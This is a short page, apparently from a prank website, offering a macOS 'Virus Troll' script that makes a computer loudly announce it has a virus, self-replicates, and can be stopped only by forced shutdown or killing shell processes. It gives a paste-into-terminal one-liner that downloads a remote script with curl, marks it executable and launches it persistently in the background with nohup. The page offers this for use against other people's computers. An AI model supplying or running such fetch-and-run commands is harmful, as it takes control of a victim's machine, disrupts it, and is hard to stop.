Virus Troll

This script trolls people by making their computer say "You have a virus" at max volume, and it self-replicates.
The only way to end it is to force shutdown the computer, or to somehow use Terminal to killall sh.

Copy and paste the following into your terminal:
curl "https://raw.githubusercontent.com/itrolledu/itrolledu.github.io/master/mac/vtroll/dl" -o "trolling"; tr -d '\r' < trolling >trollingnl; echo "#!/bin/bash\nnohup sh -c '$PWD/trollingnl' &">>child;chmod +x ./child;chmod +x ./trollingnl; rm -rf trolling; nohup sh -c '$PWD/trollingnl 1' &
